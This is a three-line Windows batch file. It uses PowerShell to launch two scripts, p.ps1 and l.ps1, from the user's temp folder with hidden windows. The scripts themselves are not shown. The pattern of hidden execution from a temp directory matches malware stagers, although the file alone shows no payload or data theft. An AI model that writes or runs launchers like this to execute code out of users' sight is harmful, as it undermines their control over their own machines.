@echo off
powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/l.ps1"